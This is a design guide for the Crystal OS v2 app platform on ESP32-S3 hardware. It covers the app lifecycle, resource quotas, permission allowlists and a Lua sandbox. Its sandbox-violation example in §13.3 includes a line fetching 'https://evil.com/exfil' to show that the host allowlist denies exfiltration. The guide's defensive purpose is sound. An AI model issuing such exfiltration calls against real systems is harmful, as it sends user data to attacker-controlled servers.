# Crystal OS App Platform — v2 Design Guide

**Version:** 2.0  
**Status:** Phase 14 closed; Phases 15–17 pending  
**Date:** 2026-11-11  
**Audience:** Architects, senior developers reviewing Phase 14-17 designs

**Versioning note:** Crystal OS v1 is Phases 1-13 — the baseline OS. Crystal OS v2 is Phase 14 and beyond — the app platform and publication release.

---

## 1. Design Principles and Trade-offs

### 1.1 Resource Cost First, Animation Capability Second

**Principle:** The ESP32-S3 has real constraints. Every design choice must justify its byte cost and CPU cycle cost. Animation smoothness emerges from discipline, not from raw horsepower.

**Trade-off:** Lua sandboxing costs ~20 KB of flash and adds 50ms callback overhead. Worth it because script is the untrusted tier; native is curated only.

**Implication for design:** When proposing new ABI calls, include:
- Flash cost (binary size delta)
- RAM cost (per-instance heap impact)
- CPU cost (instruction count in hot path)

If cost > benefit, defer to a future phase or suggest script-level library instead.

### 1.2 Handles, Not Pointers

**Principle:** Every ABI object is a `u32` index into a per-app table. A stale or fabricated handle is a caught error, not a jump into garbage.

**Trade-off:** Extra indirection (one table lookup per API call) vs. safety. Worth it.

**Implication for design:** 
- Script apps cannot hold direct pointers to OS objects.
- Handles die at `onDestroy()`. No saved UI trees across launches.
- A handle table is per-app. App A's handle 5 ≠ App B's handle 5.

### 1.3 Immutable Packages, Mutable State

**Principle:** A `.capp` is read-only code/assets. State lives in `/apps/<id>/data/state.json` or NVS, both writable.

**Trade-off:** Simpler uninstall (delete folder = delete everything). No partial uninstalls.

**Implication for design:**
- In-app data is always in `data/` or NVS, never scattered in the package.
- Upgrading an app is delete + reinstall (hot code reload not supported).
- User can hand-delete folder over USB; reconcile at boot erases the registry row.

### 1.4 One App at a Time, Lifecycle is Explicit

**Principle:** `max_running_num = 1`. No background apps. The four-state lifecycle (`onCreate`, `onResume`, `onPause`, `onDestroy`) is enforced, not optional.

**Trade-off:** Simpler model (no concurrency, no background services yet). Apps are easier to write correctly.

**Implication for design:**
- Phase 8 (overlay lifecycle with `onStart`/`onStop`) is the first crack in this assumption.
- Until then, an app is either running (visible) or destroyed (dead).
- Timers armed by an app survive its destruction; that's acceptable.

### 1.5 ABI is the Contract, Runtime is Swappable

**Principle:** Three tiers (declarative, script, native) are implementations of one ABI. Changing the ABI is a version bump; adding to it is a minor bump.

**Trade-off:** ABI design is slower and more conservative than a single implementation would be. Worth it for longevity.

**Implication for design:**
- Every new ABI call must work in all three tiers or explain why not.
- Declarative tier freezes ABI v1 (Phase 16). Changes after that are v2.
- Script tier (Phase 17) cannot add calls not in the ABI.

---

## 2. Lifecycle Design

### 2.1 The Four States

```
onCreate (always)
  ├─> [UI construction, state restoration]
  └─> return true/false
       ↓
onResume (if onCreate returned true)
  ├─> [start timers, request updates]
  └─> return true/false
       ↓
[app is visible; user interacts]
  ├─> touch input
  ├─> timers fire
  ├─> async callbacks arrive
  └─> ...
       ↓
onPause (on any exit path)
  ├─> [stop timers, save state, cancel requests]
  └─> return true/false (ignored)
       ↓
onDestroy (after onPause)
  ├─> [release resources, unregister listeners]
  └─> return true/false (ignored)
       ↓
[handles dead; tree deleted]
```

### 2.2 Why onCreate Runs Every Launch

**Decision:** No saved UI state. Apps rebuild their trees in `onCreate` on every activation.

**Rationale:**
1. Simpler model: no restore/save logic.
2. Handles die at `onDestroy`, so there's nowhere to save them.
3. Users expect "fresh" app state on re-open (like mobile).
4. Saves RAM (no tree held in memory when app is not running).

**Trade-off:** onCreate must be fast (80-500ms depending on tier). Apps that need fast resume must cache state and rebuild UI quickly.

**Implementation note:** If an app needs "pick up where you left off" behavior, it saves the view state (e.g., `state.set("active_tab", 2)`) and restores it in onCreate:
```lua
function onCreate()
    local active_tab = state.get("active_tab") or 0
    buildTabs()
    if active_tab > 0 then
        switchToTab(active_tab)
    end
    return true
end
```

### 2.3 Why onPause is the Only Guaranteed Write Point

**Decision:** `onPause` always fires before destruction or switch. It's the only guaranteed moment to save state.

**Consequence:** Apps are forbidden to write state in onCreate, onResume, or during callbacks. That state is lost on unexpected destruction.

**Rationale:**
- If user force-closes the app (swipe away, or power loss), only onPause has run.
- If a crash occurs in onCreate, onPause never runs (acceptable; app state is orphaned, user can clear data).
- onResume → timers/requests are started → user swiped away → onPause fires → onDestroy fires. State is saved mid-session.

**Design consequence:** Stateless apps (Clock, Calculator) don't need onPause logic. Stateful apps (favorites, search history, bookmarks) must implement it.

### 2.4 onBack Gesture and the Back Stack

**Decision:** `onBack` is a gesture callback, not a state change. Firing onBack does not trigger onPause/onDestroy.

**Implication:** An app can handle "back" navigation (close a modal, go to previous tab) without losing state.

**Trade-off:** onBack must return a bool (consumed or not). If not consumed, the gesture passes to the next app in the stack (Phase 6 rule).

**Design pattern:**
```lua
function onBack()
    if is_modal_open then
        closeModal()
        return true  -- consumed
    end
    if current_tab > 0 then
        switchToTab(0)
        return true
    end
    return false  -- pass to next app
end
```

### 2.5 onCreate Budget Tiers

**Design decision:** Three tiers of onCreate budgets, with guidance on what's acceptable.

| Tier | Budget | Enforcement | When to Use |
|------|--------|-------------|------------|
| Simple | 80ms | Debug warning if exceeded | Clock, Calculator, widgets |
| Standard | 200ms | Debug warning if exceeded | Weather (network check), basic data apps |
| Data-heavy | 500ms | Debug warning if exceeded | Bus (catalog validation), transit apps |

**Why three tiers:** Bus app evidence showed 275-500ms onCreate is realistic for complex apps with large datasets. 80ms hard limit would exclude legitimate workloads.

**Enforcement:** Budget is a warning, not a hard limit. Exceeding it logs a message in debug builds but doesn't block launch. This matches Phase 12 pattern.

**Alternative pattern:** Lazy UI construction. Defer expensive work to onResume or background timer, show "Loading..." state:

```lua
function onCreate()
    buildDefaultView()  -- 30ms, always fast
    -- Defer search UI, catalog validation to onResume
    return true
end

function onResume()
    if not catalogs_loaded then
        timer(0, function()  -- Next frame
            loadCatalogs()   -- Can take 200ms
        end)
    end
end
```

**Design implication:** Apps can use either approach (upfront or lazy) depending on their nature. Choose the pattern that feels right for the UX.

---

## 3. Resource Isolation and Admission Control

### 3.1 Per-App Resource Handles

**Design decision:** Every app instance gets one service handle, tracking its allocations.

**Pattern:**
```c
typedef opaque bus_service_handle_t;

bus_service_handle_t bus_service_create(const char *app_id);
void bus_service_destroy(bus_service_handle_t h);

esp_err_t bus_service_request_route(bus_service_handle_t h, const char *route);
```

**Implication:** All singleton services (WiFi, HTTP, database) are refactored to instance-based APIs. No global state per app.

**Implementation note:** The service holds a list of resources (task handles, queues, timers) tagged with the app's ID. On destroy, the list is scanned for leaks (Phase 14's `crystal_app_verify_cleanup`).

### 3.2 Admission Control at Install Time

**Design decision:** Reject install if resource sum exceeds capacity.

**Algorithm:**
```
available_psram = total_psram - os_reserved - wifi_reserved
available_storage = apps_partition_size - filesystem_overhead

for each installed app:
    total_memory_used += app.memory_kb
    total_storage_used += app.folder_size + app.storage_kb
    total_workers += app.worker_threads

if total_memory_used + new_app.memory_kb > available_psram:
    reject("PSRAM quota exceeded")
if total_storage_used + new_app.folder_size > available_storage:
    reject("Storage quota exceeded")
if total_workers + new_app.worker_threads > max_freertos_tasks:
    reject("Worker thread quota exceeded")
```

**Trade-off:** Conservative (rejects some installs that might fit) vs. permissive (allows overcommit until runtime failure). Recommend conservative.

**Implication:** Users cannot install 100 memory-heavy apps, but they can install 20-30 mixed apps.

### 3.3 Memory Ceiling Per App

**Design decision:** Each script app has a per-app allocator drawing from PSRAM against its manifest `memory_kb`.

**Implementation:** Lua's `lua_setallocf` hook redirects allocations to a per-app arena with a hard size limit.

**Consequence:**
- Allocation failure is a Lua error, not a system panic.
- App cleans up via onDestroy; OS continues.
- Over-allocation is caught immediately, not silently ignored.

**Design pattern:** App declares realistic budget:
```yaml
memory_kb: 160  # 30 LVGL objects + route cache
```

If app needs more, it increases the budget and the install rejects on devices with insufficient PSRAM. User gets a clear message, not silent failure.

---

## 4. State Persistence Design

### 4.1 Namespace Isolation

**Design decision:** Script app NVS keys are automatically prefixed with `<app_id>:`.

**Mechanism:**
```c
// App writes:
state.set("fav_data", {...})

// Host writes to NVS:
nvs_set_blob(handle, "com.example.myapp:fav_data", {...}, size)
```

**Consequence:**
- Two apps both using key "fav_data" don't collide.
- On uninstall, enumerate NVS, erase all keys matching `com.example.myapp:*`.
- No orphaned keys after uninstall.

**Trade-off:** Namespace prefix overhead (~30 bytes per key) vs. collision safety. Worth it.

**Bundled apps remain unprefixed** for backward compatibility:
```c
// Bundled Weather writes:
CrystalState::set("current_temp", 22)

// Writes to NVS directly:
nvs_set_i32(handle, "current_temp", 22)
```

Bundled apps still use `CrystalState` NVS directly; script apps use `crystal.state` which adds the prefix.

### 4.2 State Persistence Across Lifecycle

**Design pattern:**
1. `onCreate` reads state via `state.get()`.
2. App runs, user interacts.
3. `onPause` writes state via `state.set()`.
4. `onDestroy` fires; app is dead.
5. User reopens app.
6. New `onCreate` reads the saved state.

**Implication:** Apps must assume nothing about runtime state; it's all in the database.

**Example:**
```lua
local favorites = nil  -- Runtime state (lost on destroy)

function onCreate()
    favorites = state.get("fav_data") or {}
    renderFavorites()
    return true
end

function onPause()
    state.set("fav_data", favorites)
    state.flush()  -- Force write (implicit at onPause too)
end

function onResume()
    -- Don't re-read; use favorites from onCreate
end
```

---

## 5. Animation and Frame Budget Design

### 5.1 Frame Budget Discipline

**Principle:** LVGL task is single-threaded. All rendering happens on Core 1. Worker threads (Core 0) do I/O and heavy compute, never rendering.

**Consequence:** Animation frame rate depends on:
1. How much work the app does on the LVGL task (callbacks, UI updates).
2. How much work the worker threads do (HTTP, parsing affects memory pressure).

**Design rule:** Keep LVGL task callbacks under 20ms. Anything longer starves the renderer.

**Measurement:** Panel measures 7-8 FPS sustained with concurrent HTTP traffic + concurrent LVGL work. This is acceptable (not 60 FPS, but smooth on a small panel).

### 5.2 onCreate Impact on User Perception

**Design consequence:** A 500ms onCreate is felt as a black screen when launching the app.

```
Timeline:
  t=0:    User taps app icon in launcher
  t=0:    Launcher fade-out animation starts
  t=100:  App onCreate begins
  t=500:  App onCreate ends; UI becomes visible
  t=600:  Launcher fade-out completes (or app fade-in completes)
  Result: User perceives 200-500ms black screen
```

**Design guidance:** 
- Minimize onCreate to < 200ms if possible.
- If onCreate must be long, show a "Loading..." splash screen immediately after the fade-out.
- Defer heavy work to onResume or a background timer.

### 5.3 Gesture Responsiveness

**Design principle:** Touch input should feel immediate (< 50ms latency).

**Implementation:** LVGL processes touch input immediately; app callbacks fire within the same frame or the next frame. No queuing delays.

**Trade-off:** If the app is doing heavy compute (Lua bytecode execution), a touch might be delayed. Acceptable if it's transient (one frame skip). Not acceptable if sustained (app stalls).

**Design consequence:** Count hook (Lua watchdog) enforces 50ms deadline per callback to prevent stalls.

### 5.4 Transition Timing

**Design principle:** Screen transitions are 200-400ms (cross-dissolve or slide). Element transitions are 100-200ms.

**Implementation:** LVGL's `lv_obj_set_style_opa` with animation timeline, managed by bundled apps.

**Script app guidance:** Use `set_hidden(h, bool)` to show/hide without animation (cost: zero). If you need transition animation, implement it as an LVGL timeline in the widget facade layer (not ABI-exposed yet).

---

## 6. Async HTTP Design

### 6.1 Why Async Only

**Principle:** Script runs on LVGL task. No blocking calls allowed.

**Consequence:**
```lua
-- WRONG: This would freeze the panel for seconds
local body = http.fetch_sync("https://slow-api.com/data")
-- Result: No touch input, no animations, 5s watchdog timeout

-- RIGHT: Async with callback
http.fetch("https://slow-api.com/data", {}, function(req_id, status, body)
    updateUI(body)
end)
-- LVGL continues rendering while request is in-flight
```

**Design implication:** HTTP is async by rule, not convention. The API doesn't expose blocking calls.

### 6.2 Request Ownership Pattern

**Design pattern:** App tracks request ID and matches callback responses.

```lua
local route_request_id = nil

function searchRoutes(query)
    route_request_id = http.fetch(url, {}, function(req_id, status, body)
        if req_id ~= route_request_id then
            return  -- Stale response; discard
        end
        local routes = parseJson(body)
        renderRoutes(routes)
    end)
end

function onBack()
    if route_request_id then
        http.cancel(route_request_id)
        route_request_id = nil
    end
    return true
end
```

**Consequence:** Rapid navigation (tab switch, back swipe) cancels old requests automatically.

**Bus app evidence:** This pattern was validated with 10 rapid tab switches; no crashes or stale callbacks.

### 6.3 Worker Thread Quota

**Design decision:** Each app can have 0-4 worker threads (declared in manifest).

**Enforcement:**
- `worker_threads: 0` → `http.fetch` returns error immediately (no network).
- `worker_threads: 1` → One concurrent background task. Second `http.fetch` while first is pending either queues or errors (spec decision, recommend queue).
- `worker_threads: 2+` → Multiple concurrent tasks.

**Implication:** A network-heavy app declares `worker_threads: 1` or `2`. A simple app declares `worker_threads: 0` and saves resources.

### 6.4 Callback Safety

**Design guarantee:** If app is destroyed mid-flight, the callback is suppressed.

**Implementation:**
1. Host maintains `request_id → app_instance` mapping.
2. On `onDestroy()`, host cancels all app's requests.
3. Worker thread completes the HTTP exchange, tries to deliver callback via `lv_async_call()`.
4. `lv_async_call` sees app is dead, discards the callback.
5. Result: No crash, no leaked resources.

---

## 7. Permission Model Design

### 7.1 Manifest Permissions

**Design principle:** Absent permissions mean denied, not unrestricted.

**Manifest schema:**
```yaml
permissions:
  notify: true              # Can call notify.toast/chime
  audio: true               # Can call notify.chime (requires speaker)
  system_timer: true        # Can arm/control OS countdown
  network_hosts:            # HTTPS/HTTP allowlist
    - api.open-meteo.com
    - data.example.com
  location: false           # Explicit deny (or omit, same effect)
```

**Runtime enforcement:** Every ABI call checks permissions:
```c
esp_err_t crystal_http_fetch(const char *app_id, const char *url, ...) {
    if (!is_url_allowed(app_id, url)) {
        return ESP_ERR_NOT_ALLOWED;  // Or error code
    }
    // proceed
}
```

**Trade-off:** Conservative (all access denied by default) vs. secure. Recommend conservative.

### 7.2 Why network_hosts is a Whitelist

**Design decision:** Apps declare the exact hosts they contact.

**Consequence:** An app cannot contact arbitrary HTTPS servers; it's restricted to its declared allowlist.

**Security implication:** 
- Prevents data exfiltration to attacker-controlled servers.
- Prevents ads (unless explicitly declared).
- User can see at install time what network access is required.

**Bundled apps bypass this** (they're trusted). Package apps are restricted.

### 7.3 Location Permission

**Design decision:** Apps can read lat/long from Settings › Region & Time, not from a GPS (ESP32-S3 has no GPS).

**Mechanism:** `location.get()` returns nil if not set in Settings, or `{lat, long}` if configured.

**Permission enforcement:** App must declare `location: true` in manifest.

---

## 8. Sandbox Design (Script Tier)

### 8.1 Count Hook: Responsiveness Watchdog

**Design pattern:** Lua VM calls a C function every ~10K instructions.

```c
void script_count_hook(lua_State *L, lua_Debug *ar) {
    uint32_t now_us = esp_timer_get_time();
    if (now_us - callback_start_us > 50000) {  // 50ms
        luaL_error(L, "Timeout: callback exceeded 50ms budget");
    }
}
```

**Consequence:** A runaway loop raises a Lua error after ~50ms, not a 5s watchdog reset.

**Trade-off:** Slight overhead per callback (check is fast, ~1 μs). Worth it for safety.

### 8.2 Allocator Hook: Memory Ceiling

**Design pattern:** Per-app memory arena with hard size limit.

```c
void *script_alloc(void *ud, void *ptr, size_t osize, size_t nsize) {
    app_allocator_t *app = (app_allocator_t *)ud;
    
    if (nsize > 0) {
        if (app->used + nsize > app->limit) {
            return NULL;  // Allocation fails
        }
        void *mem = psram_alloc(nsize);
        if (mem) app->used += nsize;
        return mem;
    } else {
        // Free case
        if (ptr) {
            psram_free(ptr);
            app->used -= osize;
        }
        return NULL;
    }
}
```

**Consequence:** App can't allocate more than `memory_kb` from the manifest. Exhaustion is a Lua error, not a system panic.

### 8.3 Environment Isolation

**Design pattern:** Per-app `_ENV`.

```lua
-- Host sets up environment before loading app script
_ENV = {
    -- Allowed:
    crystal = crystal_api_table,
    math = math,
    string = string,
    table = table,
    coroutine = coroutine,
    
    -- Removed (security):
    -- os = nil,
    -- io = nil,
    -- package = nil,
    -- require = nil,
    -- load = nil,
    -- loadstring = nil,
}
```

**Consequence:** Apps can't access the filesystem directly (only via `crystal.fs`), can't spawn processes, can't require C modules.

### 8.4 Filesystem Isolation

**Design pattern:** All paths are bundle-relative, validated at the host.

```c
esp_err_t crystal_fs_read(const char *app_id, const char *path, 
                          char **out_data, size_t *out_len) {
    // Validate path: no "..", no absolute, no "../.."
    if (strstr(path, "..") || path[0] == '/') {
        return ESP_ERR_INVALID_ARG;
    }
    
    // Resolve: /littlefs/apps/<app_id>/assets/<path>
    // Or:     /littlefs/apps/<app_id>/data/<path>
    
    // Read file; return data
}
```

**Consequence:** Apps can't read other apps' data or system files.

---

## 9. Control Panel Architecture

### 9.1 API-First Design

**Principle:** One JSON API, two transports (WiFi + USB).

**Consequence:** Manage Apps (on-device) and external panel are clients of the same API. They can't disagree.

### 9.2 Two Transports, One Message Format

**WiFi transport:**
- HTTP over WiFi
- mDNS discovery: `crystal-<serial>.local`
- Served by `esp_http_server` (built-in)

**USB transport:**
- USB CDC-ACM (serial emulation)
- Messages framed as JSON with newline delimiters
- Served by TinyUSB driver
- Accessible via Web Serial in browser (same web UI, different transport)

**Implication:** Developers use the same API whether the device is over WiFi or USB. Seamless.

### 9.3 Security Model

**Design decision:** Pairing PIN instead of password.

**Flow:**
1. Settings › Developer › Enable API → PIN generated on-device.
2. PIN displayed on the panel's own screen (not asked in keyboard).
3. User enters PIN in external panel (web UI or CLI).
4. PIN exchanged for 24h bearer token.
5. All future requests include bearer token.

**Consequence:** No brute-force guessing (PIN changes every enable/disable). Single device can't be controlled from multiple places simultaneously (unless PIN re-shared).

### 9.4 Developer CLI Philosophy

**Design principle:** The CLI is not a convenience; it's a requirement for viability.

**Essential commands:**
- `crystal pack ./myapp/` → Package format
- `crystal install --usb ./myapp/` → Sideload unsigned (dev mode)
- `crystal logs -f` → Stream errors (edit-test loop viability)
- `crystal run ./myapp/` → Install + launch + logs (one command)

**Trade-off:** Extra tooling maintenance vs. adoption likelihood. Recommend building from the start.

---

## 10. Partition and Storage Architecture

### 10.1 Why LittleFS for Apps

**Decision:** LittleFS (not SPIFFS or FAT32) for `/apps` partition.

**Rationale:**
1. **Real directories:** Folder hierarchies, not FAT chains.
2. **Power-fail safe:** Atomic writes; no corrupted files on power loss during install.
3. **Wear balance:** Excellent behavior under repeated install/delete cycles.
4. **No fragmentation:** File allocation is contiguous when possible.

**Trade-off:** Larger overhead (16 KB formatting) vs. reliability. Worth it for app installs.

### 10.2 Boot Reconciliation

**Design pattern:** Walk three sources (firmware builtins, LittleFS folders, NVS registry) and merge.

```
Sources:
  1. Compiled-in app table (builtin: Clock, Weather, Calculator)
  2. /littlefs/apps/*/app.json files (package apps)
  3. NVS registry rows

Merge logic:
  For each app by ID:
    - If folder exists and row exists: update row.origin
    - If folder exists, no row: create row (newly sideloaded)
    - If row exists, no folder: delete row (app deleted behind OS)
    - If builtin, no folder: keep row (OS assets, not on disk)

Result: Unified app list, ordered by slot, ready to install
```

**Consequence:** Hand-deleting a folder over USB is a complete, clean uninstall.

### 10.3 Sizing and Capacity

**Available space:**
- Apps partition: 5.5 MB
- Filesystem overhead: ~2% (110 KB)
- Usable: ~5.4 MB

**Realistic capacity:**
- 100+ simple apps (30-50 KB each)
- 40-60 standard apps (80-120 KB each)
- 3-4 data-heavy apps (1-2 MB each)
- Mixed ecosystem: 10-15 apps typical

**What doesn't fit:**
- Photo galleries (per-image > 100 KB)
- Game sprite sheets (full atlas > 2 MB)
- Offline map tiles (full region > 5 MB)

**Solution:** Stream large assets from network on-demand.

---

## 11. Phase Dependencies and Sequencing

### 11.1 Why Phase 14 Must Come First

**Phase 14 (Package format, registry):**
- Establishes the fundamental structure (folder layout, manifest, `.capp` format).
- Enables phases 15-17 to build on a stable foundation.
- Converts Calculator to package (proof of concept).

**Phases 15-17 can be reordered** once Phase 14 is stable:
- **Phase 15** (Control panel, signatures): Enabled by Phase 14; enables easier testing for Phase 16-17.
- **Phase 16** (Declarative): Independent of Phase 15/17; freezes ABI v1.
- **Phase 17** (Script): Depends on Phase 16 (ABI stable); requires Phase 14 (resource handles).

### 11.2 Bus App Role in Validation

**Phase 14:** Use Bus app as resource leak detector. If Calculator passes but Bus leaks, the verification is incomplete.

**Closure record (2026-11-11):** Calculator passed on the board, and the host
confirmed that retained Bus-style task/queue ownership disables the app and
blocks uninstall. The full Bus network workload on the board is carried
forward as a hardware follow-up in the [Phase 14 closure notes](PHASE_14_IMPLEMENTATION.md).

**Phase 17:** Use Bus app as stress test. HTTP concurrency, catalog validation, UI complexity all in one app.

**Never shipping Bus app.** It's a development artifact; its role is to validate the platform.

---

## 12. Animation Design Patterns

### 12.1 Bundled Apps as Baseline

**Clock, Weather, Calculator set the animation norm:**
- Frame budget: 7-8 FPS sustained is acceptable; don't aim for 60 FPS.
- Gesture responsiveness: < 50ms latency on touch.
- Transition timing: 200-400ms cross-dissolves.
- Idle animation: Subtle pulses or breathing, not distracting.

**Package apps should match this profile.** If an app feels slower, it's usually doing work on the LVGL task that shouldn't be there.

### 12.2 State Transitions and Animations

**Design pattern:** Animations complete during state transitions; app code doesn't block them.

```
User gesture
  ↓
Animation starts (LVGL draws frames)
  ↓
App code runs in parallel on worker (if async work)
  ↓
Animation completes
  ↓
onPause fires
  ↓
onDestroy fires
```

**Implication:** App can't delay an animation by doing work in a callback. Long callbacks cause frame drops.

### 12.3 Lazy Loading and "Loading..." UI

**Design pattern:** If onCreate would exceed budget, defer heavy work.

```lua
function onCreate()
    buildMinimalUI()  -- 50ms
    loading_indicator = showSpinner()
    
    timer(0, function()  -- Next frame
        loadCatalogs()    -- 200ms, happens off-UI
        hideSpinner()
        renderFullUI()
    end)
    
    return true
end
```

**User perception:** App opens quickly, shows spinner, fills in content. Better than black screen.

---

## 13. Error Handling and Recovery

### 13.1 Three-Strike Rule

**Design decision:** Three consecutive launch failures → app auto-disabled.

**Flow:**
1. First launch fails → error_count = 1
2. User taps app again → fails → error_count = 2
3. User taps app again → fails → error_count = 3 → app disabled
4. Manage Apps shows notice: "App not responding"
5. User can re-enable or uninstall

**Consequence:** A broken app doesn't create a boot loop; it's taken offline automatically.

### 13.2 Manifest Validation Errors

**Design decision:** Invalid manifest → install rejected with reason.

**Examples:**
- `abi: 2` on abi-v1 device → "App requires newer OS"
- `memory_kb: 10000` on device with 5MB available → "Insufficient memory"
- `network_hosts` present but `worker_threads: 0` → "App needs worker thread for networking"

**User sees:** Toast with reason; install doesn't proceed.

### 13.3 Sandbox Violation Errors

**Design decision:** Apps don't crash on permission denial; they get errors.

**Example:**
```lua
-- App tries to fetch from unlisted host
local result = http.fetch("https://evil.com/exfil", {}, cb)
-- Result: error code or nil; callback never fires
```

**User sees:** App handles the error gracefully (shows "Network error" or similar).

---

## 14. Design Checklist

### For Phase 14

Closed on 2026-11-11 with the implementation adaptations and follow-ups in
[Phase 14 closure notes](PHASE_14_IMPLEMENTATION.md). Production signature
verification remains a Phase 15 deliverable.

- [x] LittleFS factory image and board mounting verified; boot reconciliation tested with hand-deleted folders on the host
- [x] Development `.capp` round-trip: pack → install → uninstall; host signing verified separately
- [x] Admission control rejects apps when declared resource sums exceed capacity
- [x] Per-app resource ledger supports task, timer, queue, allocation, and object ownership for curated native packages
- [x] `crystal_app_verify_cleanup()` detects registered leaks and retains the installed owner and data on failure
- [x] NVS namespace isolation: logical `<app_id>:key` entries in owner-checked blobs respecting physical key limits
- [x] Uninstall erases all package state; fresh state after reinstall verified
- [x] Calculator package passes 10 install/launch/uninstall cycles on the board, including reboot persistence

### For Phase 15

- [ ] API endpoints match spec (§9.3 of Implementation Plan)
- [ ] Web UI works over WiFi and USB
- [ ] Pairing PIN flow generates PIN on device, accepts PIN in external panel
- [ ] Bearer token validated on every request
- [ ] Ed25519 signature verification prevents unsigned packages (outside dev mode)
- [ ] Install progress bar shown for packages > 1 MB
- [ ] On-device Manage Apps and external panel agree after edits

### For Phase 16

- [ ] `DeclarativeApp` class implements `CrystalApp` interface
- [ ] `ui.json` parsing and object tree construction works
- [ ] Data binding to `crystal.service` values (time, network, timer)
- [ ] Event routing (buttons → system actions)
- [ ] All bundled app UIs expressible without ABI additions
- [ ] ABI v1 frozen; no further changes in this phase

### For Phase 17

- [ ] Lua 5.4 sandbox enforces count hook (50ms deadline) and allocator ceiling
- [ ] Async `http.fetch` with callback model tested
- [ ] Worker thread quota: second request queues or errors when limit reached
- [ ] `data/` quota enforcement: writes beyond limit fail
- [ ] `crystal run` works end-to-end (pack, install, launch, log stream)
- [ ] Bus app converted to script tier; resource cleanup verified
- [ ] Runaway loop produces app death + toast, not watchdog reset

